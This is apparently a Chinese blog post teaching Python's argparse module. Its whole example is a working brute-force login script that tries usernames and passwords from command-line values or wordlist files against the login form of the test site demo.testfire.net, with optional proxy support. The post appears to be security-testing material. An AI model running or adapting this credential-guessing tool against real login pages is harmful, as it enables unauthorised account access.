{"title": "python argparse 的使用 - 个人文章 ", "index": "安全测试,python", "content": "一、简介：\nargparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。argparse模块的作用是用于解析命令行参数，例如python parseTest.py input.txt output.txt --user=name --port=8080。\n二、使用步骤：\n1：import argparse\n2：parser = argparse.ArgumentParser()\n3：parser.add_argument()\n4：parser.parse_args()\n# -*- coding:utf-8 -*-\n\n\nimport argparse\nimport requests\nimport sys\n\n\ndef login(user, passwd, proxy):\n    if proxy:\n        proxy = {'http': proxy}\n    print proxy\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',\n        'Referer': 'http://demo.testfire.net/bank/login.aspx',\n        'Upgrade-Insecure-Requests': '1',\n        'Content-Type': 'application/x-www-form-urlencoded',\n    }\n\n    data = {\n        'uid': user,\n        'passw': passwd,\n        'btnSubmit': 'Login'\n    }\n    if proxy:\n\n        html = requests.post('http://demo.testfire.net/bank/login.aspx', proxies=proxy, headers=headers, data=data, allow_redirects=False, verify=False)\n    else:\n        html = requests.post('http://demo.testfire.net/bank/login.aspx', headers=headers, data=data, allow_redirects=False, verify=False)\n\n    if html.status_code == 302:\n        print u\"[+] 爆破成功!!\", user + '/' + passwd\n    else:\n        print u\"[+] 爆破失败!!\"\n\n\n\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description=u\"[+]-----------------NO JS 批量爆破测试－python版-----------------[+]\")\n    parser.add_argument('-u', '--user', default=False, dest='user', help='specific one user')\n    parser.add_argument('-p', '--password', default=False, dest='password', help='specific one password')\n    parser.add_argument('-U', default=False, dest='User', help='specific a directory file of users')\n    parser.add_argument('-P', default=False, dest='Password',help='specific a directory file of passwords')\n    parser.add_argument('-D', '--dict', default=False, dest='dict',help='specific a dict file of users and passwords')\n    # parser.add_option('-T', '--target', default=False, help='specific the target dvwa brute force url')\n    parser.add_argument('--proxy', default=False, dest='proxy', help='use a http proxy')\n\n    args = parser.parse_args()\n    proxys = args.proxy\n\n    if not ((args.user or args.User) and (args.password or args.Password)) and not args.dict:\n        print parser.parse_args(['-h'])\n        sys.exit()\n\n\n    elif ((args.user or args.User) and (args.password or args.Password)) and args.dict:\n        print parser.parse_args(['-h'])\n        sys.exit()\n\n    elif (args.user or args.User) and (args.password or args.Password):\n        users = []\n\n        if args.user:\n            users.append(args.user)\n        else:\n            try:\n                user = open(args.User, 'r').readlines()\n                for i in user:\n                    users.append(i[:-1])\n            except Exception, e:\n                raise e\n\n        passwords = []\n        if args.password:\n            passwords.append(args.password)\n        else:\n            try:\n                password = open(args.Password, 'r').readlines()\n                for i in password:\n                    passwords.append(i[:-1])\n            except Exception, e:\n                raise e\n\n        for u in users:\n            for p in passwords:\n                print proxys\n                login(u, p, proxys)\n\n\n    elif args.dict:\n\n        account_list = []\n        try:\n            account = open(args.dict, 'r').readlines()\n            for D in account:\n                account_list.append(D)\n        except Exception, e:\n            raise e\n\n        for D in account_list:\n            #time2 = random.randint(2, 90)\n            u = D.split(':')[0].strip()\n            p = D.split(':')[1].strip()\n\n            login(u, p, proxys)\n\n\n                ", "mainLikeNum": ["0 "], "mainBookmarkNum": "1"}